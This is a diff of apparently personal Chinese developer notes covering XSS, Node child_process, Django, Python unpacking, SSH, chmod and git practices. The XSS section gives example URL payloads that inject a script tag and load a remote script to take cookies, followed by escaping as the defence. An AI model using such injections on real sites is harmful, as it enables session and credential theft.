@@ -1,3 +1,5 @@
+## 网络
+
 #### 1 常见的web攻击
 
 - XSS：cross site scripting 跨站脚本攻击；有漏洞的网站运行攻击者的脚本命令。可以利用虚假表单获取个人信息。利用 JS 获取用户的cookie值。被害者在不知情的情况下，帮助攻击者发送恶意请求（显示伪造的文章或者图片，显示伪造的网页登录情况）。例子：被攻击的A网站中，通过URL传值，获取登录用户名。那么攻击者在URL中设置自己的攻击脚本，获取cookie等信息。`localhost:3000/?id=<script>alert('1')</script>` 进一步执行远程脚本 `localhost:3000/?id=<script src="http://www.baidu.com/index.js"></script>` 获取信息。
@@ -19,37 +21,37 @@ HTMLescape: function(html) {
 
 然后把生成的HTML，使用 `<a href="://www.baidu.com"> + str + </a>` 包起来，这样就避免了XSS
 
-#### 6 Django
+开课吧笔记有两节安全的课程，可以参考
+
+
+
+## NodeJS
+
+#### 1. nodejs 中输入 bash 命令
+
+需求：写一个nodejs 脚本，然后批量操作文件或者查询文件信息（使用bash命令）
+
+~~~js
+var process = require('child_process');
+var command = "ls -al";
+process.exec(command, function(err, stdout, stderr) {
+  console.log(err);
+  console.log(stdout);
+  console.log(stderr);
+});
+~~~
+
+
+
+## Python
+
+#### 1 Django打包后样式
 
 django模板样式：在开发模式下，直接通过 import 可以导入 CSS 文件。在生产环境下，会把相互的依赖关系分别打包，然后Django后端模板中需要插入对应的JS和CSS文件。这个本地开发测试不出来。（本地环境下正常，在线环境下面不正常的情况）
 
 本地环境下面，只显示项目的CSS，可能在生产环境下，项目中的CSS可能和第三方库的CSS冲突（类名冲突）
 
-#### 3 ssh
-
-ssh 用于登录远程主机，命令是 `用户名@远程主机的ip`，本地使用虚拟机测试，流程如下（这个适合虚拟机和宿主机的通信）
-
-1、打开虚拟机，使用 ifconfig | grep 'inet' 查看虚拟机的IP地址（eg: 192.168.1.168）
-
-2、在宿主机打开终端，使用 ssh michael@192.168.1.168 登录，然后输入虚拟机账户密码，即可进入
-
-3、如果提示网络连接不上，可以查看局域网是否畅通，或者重启虚拟机（重新获取IP）
-
-4、操作虚拟机（例如部署 python3 环境等）
-
-5、退出时，执行 exit() 命令
-
-（需要测试不在一个局域网下的主机是否可以远程登录）
-
-尝试使用联想电脑连接无线，然后开启服务器；使用mac链接手机热点，看能否SSH正常登录一下——SSH 需要在同一个局域网中进行处理。现在报错 22 端口没有开放，稍后继续尝试；两台电脑需要预先设置支持远程登录。
-
-man 命令（manual）可以查看一个命令的帮助文档： man git （git manual 文档）
-
-笔记：移动端的键盘输入问题和切换界面问题；如果是一个界面内部的，不需要考虑；如果是新开的一个页面，需要考虑这个问题；目前的解决办法是，主动让 input 失去焦点，输入法自动关闭，再打开下一单页面（实际问题：移动端中，用户编辑过滤器时，先输入文本或者数字，移动端键盘打开，然后更改列，键盘没有及时关闭，样式错误）
-
-笔记：input file 上传后，应该清空一个 input 的值(input.value = '')，这样再次上传同名文件是正常的。
-
-#### 4 Python序列解包
+#### 2 Python序列解包
 
 序列解包是 python3 的语法糖，可以批量进行复制或者解包
 
@@ -94,7 +96,39 @@ H []
 
 本质上，python 变量存储的不是值，而是内存地址。这个操作是把引用的内存地址直接交换。
 
-#### 5 chmod
+
+
+
+
+## Bash
+
+#### 1 ssh
+
+ssh 用于登录远程主机，命令是 `用户名@远程主机的ip`，本地使用虚拟机测试，流程如下（这个适合虚拟机和宿主机的通信）
+
+1、打开虚拟机，使用 ifconfig | grep 'inet' 查看虚拟机的IP地址（eg: 192.168.1.168）
+
+2、在宿主机打开终端，使用 ssh michael@192.168.1.168 登录，然后输入虚拟机账户密码，即可进入
+
+3、如果提示网络连接不上，可以查看局域网是否畅通，或者重启虚拟机（重新获取IP）
+
+4、操作虚拟机（例如部署 python3 环境等）
+
+5、退出时，执行 exit() 命令
+
+（需要测试不在一个局域网下的主机是否可以远程登录）
+
+尝试使用联想电脑连接无线，然后开启服务器；使用mac链接手机热点，看能否SSH正常登录一下——SSH 需要在同一个局域网中进行处理。现在报错 22 端口没有开放，稍后继续尝试；两台电脑需要预先设置支持远程登录。
+
+man 命令（manual）可以查看一个命令的帮助文档： man git （git manual 文档）
+
+笔记：移动端的键盘输入问题和切换界面问题；如果是一个界面内部的，不需要考虑；如果是新开的一个页面，需要考虑这个问题；目前的解决办法是，主动让 input 失去焦点，输入法自动关闭，再打开下一单页面（实际问题：移动端中，用户编辑过滤器时，先输入文本或者数字，移动端键盘打开，然后更改列，键盘没有及时关闭，样式错误）
+
+笔记：input file 上传后，应该清空一个 input 的值(input.value = '')，这样再次上传同名文件是正常的。
+
+
+
+#### 2 chmod
 
 change mode :用户对文件的权限的命令
 
@@ -117,7 +151,11 @@ echo "build start------"
 cd book && mkdocs build
 ~~~
 
-#### 6 git cherry-pick 
+
+
+## GIT
+
+#### 1 git cherry-pick 
 
 问题原因：想把一个分支上的一个或者几个 commits 提交到另一个分支上面。比如把 1.5 分支上的后续修复 commit 提交到 master 分支上。但是不需要把全部的 1.5 分支的全部 commits 放在 master 上，可以使用这个命令。下面是操作过程
 
@@ -155,3 +193,10 @@ git cherry-pick A-hash B-hash # 把两个hash之间的全部Commits放到master�
 这样master上就有了1.5分支上的几个commit了。
 
 参考：http://www.ruanyifeng.com/blog/2020/04/git-cherry-pick.html
+
+#### 2 git 命名规范
+
+- commit 命名：每次commit，要标准和准确的描述做了什么，改了什么，删除了什么，新增了什么
+- 分支命名：version/1.2.3（大版本分支），feature/login（新增特性分支简写feat）person/michael-an/bugfix-editor（个人分支）special/firefox-debug（特殊分支）前面是大类-后面是功能说明 hotfix（紧急修复分支）
+- tag只能适用用稳定的版本
+
